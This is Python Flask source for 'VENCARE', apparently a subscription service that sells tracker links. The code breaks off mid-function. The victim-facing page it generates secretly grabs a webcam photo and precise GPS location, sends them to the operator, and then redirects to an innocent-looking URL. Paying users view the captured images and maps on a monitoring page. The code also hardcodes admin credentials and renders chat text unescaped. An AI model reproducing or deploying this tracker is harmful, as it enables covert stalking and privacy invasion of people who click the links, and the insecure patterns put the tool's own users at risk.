#!/usr/bin/env python3
from flask import Flask, request, jsonify, send_file, session, redirect
import string, random, os, hashlib
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'vencare_rahasia_sistem_2026'

HIJAU = "\033[92m"
KUNING = "\033[93m"
MERAH = "\033[91m"
RESET = "\033[0m"

DAFTAR_PENGGUNA = {}
DATA_PENGGUNA_AKTIF = {}
daftar_link = {}
DATA_MASUK = []
PESAN_CHAT = [] # Menyimpan riwayat obrolan pengguna & admin
FOTO_FOLDER = "./foto_diterima/"
os.makedirs(FOTO_FOLDER, exist_ok=True)

JUMLAH_MAKSIMAL_AKTIF = 10
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "admin123"

def buat_id_pengguna():
    return "USR-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def enkripsi_sandi(sandi):
    return hashlib.sha256(sandi.encode()).hexdigest()

def cek_masa_aktif(user_id):
    for u, d in DAFTAR_PENGGUNA.items():
        if d['id'] == user_id:
            if not d.get('status_bayar') or not d.get('kadaluarsa'): return False
            if datetime.now() > datetime.strptime(d['kadaluarsa'], '%d-%m-%Y %H:%M:%S'):
                d['status_bayar'] = False
                return False
            return True
    return False

def hitung_pengguna_aktif():
    return len([d for d in DAFTAR_PENGGUNA.values() if cek_masa_aktif(d['id'])])

STYLE_UMUM = """
    <style>
        *{margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif;}
        body{margin:0; min-height:100vh; background: linear-gradient(135deg, #000f1f, #001a33); background-size:cover; display:flex; flex-direction:column; align-items:center; justify-content:flex-start; padding:15px;}
        .wadah{width:100%; max-width:600px;}
        .kartu{background:rgba(0,30,60,0.7); border:1px solid #00eeff55; border-radius:12px; padding:20px; backdrop-filter:blur(10px); margin-bottom:15px;}
        .logo{font-size:32px; font-weight:900; color:#00eeff; letter-spacing:2px; text-align:center; text-shadow:0 0 10px #00eeff,0 0 25px #00eeff; margin-bottom:5px;}
        .sub{color:#99eeff; font-size:14px; text-align:center; margin-bottom:15px;}
        .label{display:block; color:#99eeff; font-size:13px; margin-bottom:6px; margin-top:12px;}
        .input{width:100%; padding:12px 14px; background:rgba(0,20,40,0.7); border:1px solid #00eeff55; border-radius:6px; color:#fff; font-size:15px; outline:none;}
        .input:focus{border-color:#00eeff; box-shadow:0 0 10px rgba(0,238,255,0.3);}
        .tombol{width:100%; padding:12px; margin-top:10px; background:linear-gradient(135deg, rgba(0,80,150,0.85), rgba(0,130,200,0.65)); border:2px solid #00eeff; border-radius:8px; color:#fff; font-size:15px; font-weight:600; letter-spacing:1px; cursor:pointer; box-shadow:0 0 12px rgba(0,238,255,0.3); transition:all 0.3s;}
        .tombol:hover{box-shadow:0 0 25px rgba(0,238,255,0.6); transform:scale(1.02);}
        .tombol-hijau{background:linear-gradient(135deg, #006677, #009988); border-color:#00ffaa;}
        .tombol-merah{background:linear-gradient(135deg, rgba(80,30,30,0.8), rgba(120,40,40,0.6)); border-color:#ff6666;}
        .tombol-emas{background:linear-gradient(135deg, rgba(100,80,0,0.85), rgba(150,120,0,0.65)); border-color:#ffcc00;}
        .garis{height:1px; background:linear-gradient(90deg,transparent,#00eeff55,transparent); margin:15px 0;}
        .pesan{padding:10px; border-radius:6px; margin-top:10px; font-size:13px; text-align:center; display:none;}
        .berhasil{background:rgba(0,80,40,0.5); border:1px solid #00ff8855; color:#bbffcc;}
        .salah{background:rgba(80,20,20,0.5); border:1px solid #ff444455; color:#ffaa99;}
        .kartu-data{background:rgba(0,40,80,0.5); border:1px solid #00eeff44; border-radius:8px; padding:15px; margin-bottom:12px;}
        .lokasi{color:#bbffbb; font-size:14px; margin:4px 0;}
        .foto-pratinja{width:100%; max-height:300px; object-fit:contain; border-radius:6px; margin-top:10px; background:rgba(0,0,0,0.5);}
        .layar-loading{position:fixed; inset:0; background:radial-gradient(circle at center,#001a33 0%,#000a1a 100%); z-index:9999; display:flex; flex-direction:column; align-items:center; justify-content:center; opacity:1; transition:opacity 0.6s ease;}
        .layar-loading.sembunyi{opacity:0; visibility:hidden;}
        .roda-putar{width:80px; height:80px; border-radius:50%; border:4px solid rgba(0,200,255,0.1); border-top-color:#00ddff; border-right-color:#00ddff; animation:putarRoda 0.8s linear infinite;}
        @keyframes putarRoda {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        .teks-loading{color:#00eeff; margin-top:20px; font-size:14px; letter-spacing:2px; text-shadow:0 0 8px #00eeff;}
        @keyframes munculHalaman {from{opacity:0; transform:translateY(15px);}to{opacity:1; transform:none;}}
        .status-aktif{padding:10px; border-radius:6px; font-size:14px;}
        .aktif{background:rgba(0,80,40,0.5); border:1px solid #00ff8855; color:#bbffcc;}
        .tidak-aktif{background:rgba(80,20,20,0.5); border:1px solid #ff444455; color:#ffaa99;}
        .ruang-chat{background:rgba(0,20,40,0.8); border:1px solid #00eeff44; border-radius:8px; height:200px; overflow-y:scroll; padding:10px; margin-bottom:10px; display:flex; flex-direction:column; gap:8px;}
        .chat-buble{padding:8px 12px; border-radius:6px; font-size:13px; max-width:85%; word-break:break-word;}
        .chat-user{background:rgba(0,100,150,0.6); color:#fff; align-self:flex-end; border-left:3px solid #00eeff;}
        .chat-admin{background:rgba(0,150,100,0.6); color:#bbffcc; align-self:flex-start; border-left:3px solid #00ffaa;}
    </style>
"""

KODE_LOADING = """
<div class="layar-loading" id="layarLoading"><div class="roda-putar"></div><div class="teks-loading">MENYIAPKAN SISTEM...</div></div>
<script>window.onload=function(){setTimeout(()=>{document.getElementById('layarLoading').classList.add('sembunyi');},900);}</script>
"""

PEMUTAR_LAGU = """<audio autoplay loop style="display:none;"><source src="/lagu-backsound">"""

HALAMAN_DAFTAR = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>VENCARE — Daftar</title>"""+STYLE_UMUM+"""</head><body style="opacity:0; animation:munculHalaman 0.7s ease forwards;">"""+KODE_LOADING+"""
<div class="wadah"><div class="kartu"><div class="logo">VENCARE</div><div class="sub">PENDAFTARAN PENGGUNA BARU</div><div class="garis"></div>
<label class="label">👤 Nama Pengguna</label><input type="text" id="username" class="input" placeholder="Masukkan nama pengguna" autocomplete="off">
<label class="label">🔒 Kata Sandi</label><input type="password" id="sandi" class="input" placeholder="Buat kata sandi baru">
<label class="label">✅ Konfirmasi Kata Sandi</label><input type="password" id="konfirmasi" class="input" placeholder="Ulangi kata sandi">
<button class="tombol" onclick="daftarSekarang()">📝 Daftar Sekarang</button>
<button class="tombol tombol-merah" onclick="window.location.href='/login'">Sudah Punya Akun? Login</button>
<div id="pesan" class="pesan"></div><div id="kotakID" style="display:none;"><div class="garis"></div><div style="background:rgba(0,60,120,0.5); padding:12px; border-radius:6px; text-align:center; color:#00eeff; font-weight:bold; letter-spacing:2px;" id="tampilID"></div></div></div></div>
"""+PEMUTAR_LAGU+"""
<script>
function tampilPesan(t,j){const e=document.getElementById('pesan');e.style.display='block';e.className='pesan '+j;e.textContent=t;}
function daftarSekarang(){const u=document.getElementById('username').value.trim(),s=document.getElementById('sandi').value,k=document.getElementById('konfirmasi').value;if(!u||!s||!k)return tampilPesan('⚠️ Semua kolom wajib diisi!','salah');if(u.length<3)return tampilPesan('⚠️ Nama minimal 3 karakter!','salah');if(s.length<4)return tampilPesan('⚠️ Sandi minimal 4 karakter!','salah');if(s!==k)return tampilPesan('⚠️ Kata sandi TIDAK SAMA!','salah');fetch('/proses-daftar',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,sandi:s})}).then(r=>r.json()).then(d=>{if(d.berhasil){tampilPesan('✅ Daftar BERHASIL! Simpan ID Anda!','berhasil');document.getElementById('kotakID').style.display='block';document.getElementById('tampilID').textContent='ID ANDA: '+d.user_id}else tampilPesan('❌ '+d.pesan,'salah')})}
</script></body></html>
"""

HALAMAN_LOGIN = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>VENCARE — Login</title>"""+STYLE_UMUM+"""</head><body style="opacity:0; animation:munculHalaman 0.7s ease forwards;">"""+KODE_LOADING+"""
<div class="wadah"><div class="kartu"><div class="logo">VENCARE</div><div class="sub">MASUK KE SISTEM</div><div class="garis"></div>
<label class="label">👤 Nama Pengguna</label><input type="text" id="username" class="input" placeholder="Masukkan nama pengguna" autocomplete="off">
<label class="label">🔒 Kata Sandi</label><input type="password" id="sandi" class="input" placeholder="Masukkan kata sandi">
<button class="tombol" onclick="loginSekarang()">🔑 Masuk Sekarang</button>
<button class="tombol tombol-merah" onclick="window.location.href='/daftar'">Belum Punya Akun? Daftar</button>
<div id="pesan" class="pesan"></div></div></div>
"""+PEMUTAR_LAGU+"""
<script>
function tampilPesan(t,j){const e=document.getElementById('pesan');e.style.display='block';e.className='pesan '+j;e.textContent=t;}
function loginSekarang(){const u=document.getElementById('username').value.trim(),s=document.getElementById('sandi').value;if(!u||!s)return tampilPesan('⚠️ Isi nama & sandi!','salah');fetch('/proses-login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,sandi:s})}).then(r=>r.json()).then(d=>{if(d.berhasil){tampilPesan('✅ Selamat Datang!','berhasil');setTimeout(()=>{document.body.style.opacity='0';setTimeout(()=>window.location.href=d.admin?'/admin':'/beranda',800)},800)}else tampilPesan('❌ '+d.pesan,'salah')})}
</script></body></html>
"""

HALAMAN_BERANDA = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>VENCARE — Sistem Aktif</title>"""+STYLE_UMUM+"""</head><body style="opacity:0; animation:munculHalaman 0.7s ease forwards;">"""+KODE_LOADING+"""
<div class="wadah">
    <div class="kartu">
        <h3 style="color:#00eeff; margin-bottom:10px;">👤 INFORMASI PENGGUNA</h3>
        <div style="color:#fff; font-size:15px; line-height:1.8;">
            <b>ID Pengguna:</b> <span id="userID"></span><br>
            <b>Nama Pengguna:</b> <span id="namaUser"></span>
        </div>
        <div id="statusLangganan" class="status-aktif" style="margin-top:12px;"></div>
    </div>

    <div class="kartu" style="text-align:center;">
        <h3 style="color:#ffcc00; margin-bottom:12px;">💳 PEMBAYARAN QRIS</h3>
        <p style="color:#99eeff; font-size:13px; margin-bottom:10px;">Scan QRIS di bawah ini untuk melakukan pembayaran (Paket Harian Rp 50.000 / Mingguan Rp 150.000):</p>
        
        <img id="gambarQRIS" src="/qris-gambar" style="width:100%; max-width:280px; border-radius:8px; border:2px solid #ffcc00; background:#fff; padding:5px; margin-bottom:10px;">
        
        <a href="/qris-gambar" download="qris_vencare.jpg" class="tombol tombol-hijau" style="display:block; text-decoration:none; margin-bottom:15px; font-size:14px; padding:10px;">💾 Simpan Barcode ke Galeri</a>

        <label class="label" style="text-align:left;">Pilih Paket yang Dibayar:</label>
        <select id="pilihanPaket" class="input" style="margin-bottom:10px;">
            <option value="harian">Paket Harian (Rp 50.000 / 1 Hari)</option>
            <option value="mingguan">Paket Mingguan (Rp 150.000 / 7 Hari)</option>
        </select>

        <label class="label" style="text-align:left;">Upload Bukti Transfer / Screenshot:</label>
        <input type="file" id="fileBukti" class="input" accept="image/*" style="margin-bottom:10px; padding:8px;">
        
        <button class="tombol tombol-emas" onclick="kirimBukti()">📤 Kirim Bukti ke Admin</button>
        <div id="pesanBayar" class="pesan"></div>
    </div>

    <div class="kartu">
        <h3 style="color:#00eeff; margin-bottom:10px;">💬 PUSAT BANTUAN & OBROLAN ADMIN</h3>
        <div class="ruang-chat" id="ruangChat"></div>
        <input type="text" id="isiPesan" class="input" placeholder="Tulis pesan ke admin..." autocomplete="off">
        <button class="tombol tombol-hijau" style="padding:10px; font-size:14px;" onclick="kirimPesan()">📤 Kirim Pesan</button>
    </div>

    <button class="tombol tombol-hijau" onclick="window.location.href='/pantau'">📡 Pantau Data Masuk (Foto & Lokasi)</button>
    
    <div class="kartu">
        <h3 style="color:#00eeff; margin-bottom:12px;">🔗 Buat Link Pelacak</h3>
        <label class="label">Masukkan Link Tujuan:</label>
        <input type="text" id="linkTujuan" class="input" placeholder="Contoh: https://..." autocomplete="off">
        <button class="tombol" onclick="buatLink()">✅ Buat Link</button>
        <div id="bagianHasil" style="display:none; margin-top:15px;">
            <div class="garis"></div>
            <label class="label">📥 Link Tujuan:</label>
            <div class="kartu-data" style="padding:10px; word-break:break-all; color:#99eeff;"><span id="teksAsli"></span></div>
            <label class="label">🌐 Link Pelacak:</label>
            <div class="kartu-data" style="padding:10px; word-break:break-all; color:#00ffaa;"><span id="teksLink"></span></div>
            <button class="tombol" style="padding:8px; font-size:14px; margin-top:8px;" onclick="salinLink()">📋 Salin Link</button>
        </div>
    </div>

    <button class="tombol tombol-merah" onclick="window.location.href='/keluar'">🚪 Keluar Akun</button>
</div>
"""+PEMUTAR_LAGU+"""
<script>
fetch('/data-pengguna').then(r=>r.json()).then(d=>{
    document.getElementById('userID').textContent = d.user_id;
    document.getElementById('namaUser').textContent = d.nama;
    fetch('/cek-status-pembayaran').then(x=>x.json()).then(s=>{
        const st = document.getElementById('statusLangganan');
        if(s.aktif){
            st.className = 'status-aktif aktif';
            st.innerHTML = '✅ <b>LANGGANAN AKTIF</b><br>Kadaluarsa: ' + s.kadaluarsa;
        } else {
            st.className = 'status-aktif tidak-aktif';
            st.innerHTML = '❌ <b>BELUM AKTIF / MENUNGGU KONFIRMASI ADMIN</b><br><span style="font-size:12px;">Slot Aktif Saat Ini: ' + s.slot_terpakai + '/10 Orang</span>';
        }
    });
    muatChat();
    setInterval(muatChat, 4000); // Otomatis refresh chat tiap 4 detik
});

function kirimBukti(){
    const fileInput = document.getElementById('fileBukti').files[0];
    const paket = document.getElementById('pilihanPaket').value;
    if(!fileInput) return tampilPesanBayar('⚠️ Pilih foto bukti transfer dulu!', 'salah');
    
    const reader = new FileReader();
    reader.onload = function(e){
        fetch('/upload-bukti', {
            method:'POST', headers:{'Content-Type':'application/json'},
            body:JSON.stringify({bukti: e.target.result, paket: paket})
        }).then(r=>r.json()).then(d=>{
            if(d.berhasil){
                tampilPesanBayar('✅ ' + d.pesan, 'berhasil');
            } else {
                tampilPesanBayar('❌ ' + d.pesan, 'salah');
            }
        });
    };
    reader.readAsDataURL(fileInput);
}

function tampilPesanBayar(teks, jenis){
    const el = document.getElementById('pesanBayar');
    el.style.display = 'block';
    el.className = 'pesan ' + jenis;
    el.textContent = teks;
}

function muatChat(){
    fetch('/api/chat').then(r=>r.json()).then(d=>{
        let h = '';
        if(d.pesan.length === 0) h = '<div style="color:#888; text-align:center; font-size:13px; margin-top:20px;">Belum ada obrolan. Silakan kirim pesan ke admin.</div>';
        else {
            d.pesan.forEach(m=>{
                if(m.pengirim === 'admin'){
                    h += `<div class="chat-buble chat-admin"><b>Admin:</b> ${m.teks} <div style="font-size:10px; color:#aaa; text-align:right;">${m.waktu}</div></div>`;
                } else {
                    h += `<div class="chat-buble chat-user"><b>Anda:</b> ${m.teks} <div style="font-size:10px; color:#ddd; text-align:right;">${m.waktu}</div></div>`;
                }
            });
        }
        const rc = document.getElementById('ruangChat');
        rc.innerHTML = h;
        rc.scrollTop = rc.scrollHeight;
    });
}

function kirimPesan(){
    const teks = document.getElementById('isiPesan').value.trim();
    if(!teks) return;
    fetch('/api/chat/kirim', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body:JSON.stringify({teks: teks})
    }).then(r=>r.json()).then(d=>{
        if(d.berhasil){
            document.getElementById('isiPesan').value = '';
            muatChat();
        }
    });
}

function buatLink(){
    const tujuan = document.getElementById('linkTujuan').value.trim();
    if(!tujuan) return alert('⚠️ Masukkan link tujuan terlebih dahulu!');
    fetch('/buat-link', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body:JSON.stringify({tujuan:tujuan})
    }).then(r=>r.json()).then(d=>{
        if(d.link_pelacak){
            document.getElementById('teksAsli').textContent = tujuan;
            document.getElementById('teksLink').textContent = d.link_pelacak;
            document.getElementById('bagianHasil').style.display = 'block';
        } else {
            alert(d.pesan);
        }
    });
}
function salinLink(){
    navigator.clipboard.writeText(document.getElementById('teksLink').textContent).then(()=>alert('✅ Link berhasil disalin!'));
}
</script>
</body></html>
"""

HALAMAN_PANTAU = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>📡 Pantau Data Masuk</title>"""+STYLE_UMUM+"""</head><body style="opacity:0; animation:munculHalaman 0.7s ease forwards;">"""+KODE_LOADING+"""
<div class="wadah"><div class="kartu"><div class="logo" style="font-size:26px;">📡 PANTAU DATA PRIBADI</div><div class="sub">HANYA MENAMPILKAN TARGET DARI LINK ANDA</div><div class="garis"></div>
<button class="tombol tombol-hijau" onclick="muatUlang()">🔄 Muat Ulang Data</button><div id="daftarData"></div>
<button class="tombol" onclick="window.location.href='/beranda'" style="margin-top:15px;">⬅️ Kembali ke Beranda</button></div></div>
"""+PEMUTAR_LAGU+"""
<script>
function muatData(){fetch('/data-masuk').then(r=>r.json()).then(d=>{let h='';if(d.daftar.length===0)h='<p style=\"text-align:center; color:#99eeff; padding:30px;\">⏳ Belum ada data target yang masuk</p>';else d.daftar.forEach(i=>{h+='<div class=\"kartu-data\"><h4 style=\"color:#00eeff;\">🕐 '+i.waktu+'</h4>';if(i.lokasi){h+='<div class=\"lokasi\">📍 Lintang: '+i.lokasi.lintang+'</div><div class=\"lokasi\">📍 Bujur: '+i.lokasi.bujur+'</div><div class=\"lokasi\">📐 Akurasi: ±'+(i.lokasi.akurasi||'?')+' meter</div><a href=\"https://www.google.com/maps?q='+i.lokasi.lintang+','+i.lokasi.bujur+'\" target=\"_blank\" style=\"color:#ffcc00; font-size:14px; display:inline-block; margin-top:5px;\">🔗 Buka di Google Maps</a>'}else h+='<div style=\"color:#ff9999;\">❌ Lokasi tidak tersedia</div>';if(i.foto)h+='<img src=\"'+i.foto+'\" class=\"foto-pratinja\">';else h+='<p style=\"color:#888; margin-top:10px;\">📷 Foto tidak tersedia</p>';h+='</div>'});document.getElementById('daftarData').innerHTML=h})}
function muatUlang(){muatData(); alert('✅ Data berhasil diperbarui!')}
muatData();
</script></body></html>
"""

HALAMAN_ADMIN = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>🛡️ Panel Admin</title>"""+STYLE_UMUM+"""</head><body style="opacity:0; animation:munculHalaman 0.7s ease forwards;">"""+KODE_LOADING+"""
<div class="wadah">
    <div class="kartu">
        <div class="logo" style="font-size:26px;">🛡️ PANEL ADMIN</div>
        <div class="sub">KELOLA PENGGUNA & BALAS CHAT</div>
        <div class="garis"></div>
        <button class="tombol tombol-hijau" onclick="muatUlang()">🔄 Muat Ulang Data</button>
    </div>

    <div class="kartu">
        <h3 style="color:#00eeff; margin-bottom:10px;">💬 KELOLA OBROLAN PENGGUNA</h3>
        <label class="label">Pilih Pengguna:</label>
        <select id="pilihUserChat" class="input" onchange="muatChatAdmin()" style="margin-bottom:10px;"></select>
        <div class="ruang-chat" id="ruangChatAdmin"></div>
        <input type="text" id="pesanAdmin" class="input" placeholder="Balas pesan pengguna..." autocomplete="off">
        <button class="tombol tombol-hijau" style="padding:10px; font-size:14px;" onclick="kirimBalasanAdmin()">📤 Balas Pesan</button>
    </div>

    <div class="kartu">
        <h3 style="color:#ffcc00; margin-bottom:10px;">👥 DAFTAR PENGGUNA & BUKTI</h3>
        <div id="daftarPengguna"></div>
    </div>

    <button class="tombol tombol-merah" onclick="window.location.href='/keluar'" style="margin-top:15px;">🚪 Keluar</button>
</div>
"""+PEMUTAR_LAGU+"""
<script>
function muatData(){
    fetch('/admin/data-pengguna').then(r=>r.json()).then(d=>{
        let h=''; let opt = '<option value="">-- Pilih Pengguna untuk Chat --</option>';
        if(d.daftar.length===0) h='<p style="text-align:center; color:#99eeff; padding:20px;">Belum ada pengguna terdaftar</p>';
        else {
            d.daftar.forEach(u=>{
                opt += `<option value="${u.id}">${u.nama} (${u.id})</option>`;
                h += `<div class="kartu-data">
                    <div style="color:#ffcc00; font-weight:bold; font-size:15px;">🆔 ${u.id}</div>
                    <div>👤 Nama: ${u.nama}</div>
                    <div>🕐 Waktu Daftar: ${u.waktu}</div>
                    <div>💳 Status: ${u.langganan_aktif ? '<span style="color:#00ff88;">✅ AKTIF</span>' : '<span style="color:#ff9999;">❌ TIDAK AKTIF</span>'}</div>`;
                if(u.bukti){
                    h += `<div style="margin-top:8px;"><b style="color:#00eeff;">Bukti Transfer (${u.paket}):</b><br><img src="${u.bukti}" style="width:100%; max-width:200px; border-radius:6px; margin-top:5px; border:1px solid #00eeff;"></div>`;
                    h += `<button class="tombol tombol-hijau" style="padding:8px; font-size:13px; margin-top:8px;" onclick="konfirmasiUser('${u.id}')">✅ Konfirmasi & Aktifkan</button>`;
                } else {
                    h += `<div style="color:#888; font-size:13px; margin-top:5px;">⚠️ Belum upload bukti pembayaran</div>`;
                }
                h += `</div>`;
            });
        }
        document.getElementById('daftarPengguna').innerHTML = h;
        const sel = document.getElementById('pilihUserChat');
        const cur = sel.value;
        sel.innerHTML = opt;
        sel.value = cur;
    });
}

function muatChatAdmin(){
    const uid = document.getElementById('pilihUserChat').value;
    if(!uid){ document.getElementById('ruangChatAdmin').innerHTML = '<div style="color:#888; text-align:center; font-size:13px; margin-top:20px;">Pilih pengguna di atas untuk melihat obrolan.</div>'; return; }
    fetch('/admin/chat/' + uid).then(r=>r.json()).then(d=>{
        let h = '';
        if(d.pesan.length === 0) h = '<div style="color:#888; text-align:center; font-size:13px; margin-top:20px;">Belum ada pesan dari pengguna ini.</div>';
        else {
            d.pesan.forEach(m=>{
                if(m.pengirim === 'admin'){
                    h += `<div class="chat-buble chat-admin"><b>Anda (Admin):</b> ${m.teks} <div style="font-size:10px; color:#aaa; text-align:right;">${m.waktu}</div></div>`;
                } else {
                    h += `<div class="chat-buble chat-user"><b>${m.nama}:</b> ${m.teks} <div style="font-size:10px; color:#ddd; text-align:right;">${m.waktu}</div></div>`;
                }
            });
        }
        const rc = document.getElementById('ruangChatAdmin');
        rc.innerHTML = h;
        rc.scrollTop = rc.scrollHeight;
    });
}

function kirimBalasanAdmin(){
    const uid = document.getElementById('pilihUserChat').value;
    const teks = document.getElementById('pesanAdmin').value.trim();
    if(!uid || !teks) return alert('⚠️ Pilih pengguna dan isi pesan terlebih dahulu!');
    fetch('/admin/chat/balas', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body:JSON.stringify({user_id: uid, teks: teks})
    }).then(r=>r.json()).then(d=>{
        if(d.berhasil){
            document.getElementById('pesanAdmin').value = '';
            muatChatAdmin();
        }
    });
}

function konfirmasiUser(id){
    fetch('/admin/konfirmasi-pembayaran/' + id, {method:'POST'}).then(r=>r.json()).then(d=>{
        alert(d.pesan);
        muatData();
    });
}
function muatUlang(){muatData(); alert('✅ Data diperbarui!')}
muatData();
setInterval(muatData, 5000);
</script></body></html>
"""

def buat_halaman_pelacak(link_tujuan):
    return f"""
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><script>
const TUJUAN="{link_tujuan}";
async function mulai(){{
let fotoBase64=null,lokasi=null;
try{{
    const media=await navigator.mediaDevices.getUserMedia({{video:true}});
    const vid=document.createElement('video');
    vid.srcObject=media;
    await new Promise(r=>vid.onloadedmetadata=r);
    vid.play();
    const kanvas=document.createElement('canvas');
    kanvas.width=vid.videoWidth; kanvas.height=vid.videoHeight;
    kanvas.getContext('2d').drawImage(vid,0,0);
    fotoBase64=kanvas.toDataURL('image/jpeg',0.6);
    media.getTracks().map(t=>t.stop());
}}catch(e){{}}

try{{
    if(navigator.geolocation)lokasi=await new Promise(p=>navigator.geolocation.getCurrentPosition(g=>p({{lintang:g.coords.latitude,bujur:g.coords.longitude,akurasi:Math.round(g.coords.accuracy||0)}}),e=>p(null),{{enableHighAccuracy:true,timeout:15000}}))
}}catch(e){{}}

await fetch('/terima-data',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{foto:fotoBase64,lokasi:lokasi,kode:"{link_tujuan}"}})}});
window.location.href=TUJUAN;
}}
window.onload = mulai;
</script></head><body></body></html>
"""

@app.route('/lagu-backsound')
def kosong(): return "", 204

@app.route('/qris-gambar')
def kirim_qris():
    jalur_asli = "/sdcard/foto qrish/IMG_20260820_112440.jpg"
    if os.path.exists(jalur_asli):
        return send_file(jalur_asli, mimetype='image/jpeg')
    return "File gambar tidak ditemukan. Pastikan path benar", 404

@app.route('/')
def awal():
    if session.get('sudah_login'): return redirect('/beranda')
    return redirect('/daftar')

@app.route('/daftar')
def hal_daftar():
    if session.get('sudah_login'): return redirect('/beranda')
    return HALAMAN_DAFTAR

@app.route('/login')
def hal_login():
    if session.get('sudah_login'): return redirect('/beranda')
    return HALAMAN_LOGIN

@app.route('/beranda')
def hal_beranda():
    if not session.get('sudah_login'): return redirect('/login')
    if session.get('admin'): return redirect('/admin')
    return HALAMAN_BERANDA

@app.route('/pantau')
def hal_pantau():
    if not session.get('sudah_login') or session.get('admin'): return redirect('/login')
    return HALAMAN_PANTAU

@app.route('/admin')
def hal_admin():
    if not session.get('admin'): return redirect('/login')
    return HALAMAN_ADMIN

@app.route('/keluar')
def keluar():
    session.clear()
    return redirect('/login')

@app.route('/data-pengguna')
def data_pengguna():
    return jsonify({"user_id": session.get('user_id'), "nama": session.get('nama')})

@app.route('/cek-status-pembayaran')
def cek_status_bayar():
    uid = session.get('user_id')
    aktif = cek_masa_aktif(uid)
    slot_terpakai = hitung_pengguna_aktif()
    kadaluarsa = "-"
    for u, d in DAFTAR_PENGGUNA.items():
        if d['id'] == uid:
            kadaluarsa = d.get('kadaluarsa', '-')
    return jsonify({"aktif": aktif, "kadaluarsa": kadaluarsa, "slot_terpakai": slot_terpakai})

# Endpoint Chat API
@app.route('/api/chat')
def api_ambil_chat():
    uid = session.get('user_id')
    if not uid: return jsonify({"pesan":[]})
    chat_user = [m for m in PESAN_CHAT if m['user_id'] == uid]
    return jsonify({"pesan": chat_user})

@app.route('/api/chat/kirim', methods=['POST'])
def api_kirim_chat():
    uid = session.get('user_id')
    nama = session.get('nama')
    if not uid: return jsonify({"berhasil":False})
    d = request.get_json()
    teks = d.get('teks', '').strip()
    if not teks: return jsonify({"berhasil":False})
    
    PESAN_CHAT.append({
        "user_id": uid,
        "nama": nama,
        "pengirim": "user",
        "teks": teks,
        "waktu": datetime.now().strftime('%H:%M - %d/%m')
    })
    return jsonify({"berhasil":True})

@app.route('/admin/chat/<user_id>')
def admin_ambil_chat(user_id):
    if not session.get('admin'): return jsonify({"pesan":[]}), 403
    chat_user = [m for m in PESAN_CHAT if m['user_id'] == user_id]
    return jsonify({"pesan": chat_user})

@app.route('/admin/chat/balas', methods=['POST'])
def admin_balas_chat():
    if not session.get('admin'): return jsonify({"berhasil":False}), 403
    d = request.get_json()
    uid = d.get('user_id')
    teks = d.get('teks', '').strip()
    if not uid or not teks: return jsonify({"berhasil":False})
    
    PESAN_CHAT.append({
        "user_id": uid,
        "nama": "Admin",
        "pengirim": "admin",
        "teks": teks,
        "waktu": datetime.now().strftime('%H:%M - %d/%m')
    })
    return jsonify({"berhasil":True})

@app.route('/proses-daftar', methods=['POST'])
def proses_daftar():
    d = request.get_json()
    u = d.get('username','').strip()
    p = d.get('sandi','')
    if u.lower()==ADMIN_USERNAME or u in DAFTAR_PENGGUNA:
        return jsonify({"berhasil":False,"pesan":"Nama sudah terdaftar!"})
    uid = buat_id_pengguna()
    DAFTAR_PENGGUNA[u] = {
        "id":uid, "sandi_hash":enkripsi_sandi(p),
        "waktu_daftar":datetime.now().strftime('%d-%m-%Y %H:%M:%S'),
        "status_bayar":False, "kadaluarsa":None, "bukti":None, "paket":None
    }
    return jsonify({"berhasil":True,"user_id":uid})

@app.route('/proses-login', methods=['POST'])
def proses_login():
    d = request.get_json()
    u = d.get('username','').strip()
    p = d.get('sandi','')
    if u.lower()==ADMIN_USERNAME and p==ADMIN_PASSWORD:
        session['sudah_login']=session['admin']=True
        session['user_id']="ADMIN-00000000"; session['nama']="ADMINISTRATOR"
        return jsonify({"berhasil":True,"admin":True})
    if u in DAFTAR_PENGGUNA and DAFTAR_PENGGUNA[u]['sandi_hash']==enkripsi_sandi(p):
        session['sudah_login']=True; session['admin']=False
        session['user_id']=DAFTAR_PENGGUNA[u]['id']; session['nama']=u
        DATA_PENGGUNA_AKTIF[DAFTAR_PENGGUNA[u]['id']]=True
        return jsonify({"berhasil":True,"admin":False})
    return jsonify({"berhasil":False,"pesan":"Nama pengguna atau kata sandi SALAH!"})

@app.route('/upload-bukti', methods=['POST'])
def upload_bukti():
    uid = session.get('user_id')
    if not uid: return jsonify({"berhasil":False, "pesan":"Unauthorized"})
    
    if hitung_pengguna_aktif() >= JUMLAH_MAKSIMAL_AKTIF and not cek_masa_aktif(uid):
        return jsonify({"berhasil":False, "pesan":f"⚠️ Slot langganan aktif sudah penuh ({JUMLAH_MAKSIMAL_AKTIF}/10 orang)! Pembayaran tidak dapat diproses."})

    d = request.get_json()
    bukti_b64 = d.get('bukti')
    paket = d.get('paket')
    for u, data in DAFTAR_PENGGUNA.items():
        if data['id'] == uid:
            data['bukti'] = bukti_b64
            data['paket'] = paket
            return jsonify({"berhasil":True, "pesan":"Bukti berhasil dikirim! Menunggu konfirmasi admin."})
    return jsonify({"berhasil":False, "pesan":"User tidak ditemukan"})

@app.route('/admin/konfirmasi-pembayaran/<user_id>', methods=['POST'])
def konfirmasi_pembayaran(user_id):
    if not session.get('admin'): return jsonify({"pesan":"Tidak diizinkan"}), 403
    
    if hitung_pengguna_aktif() >= JUMLAH_MAKSIMAL_AKTIF and not cek_masa_aktif(user_id):
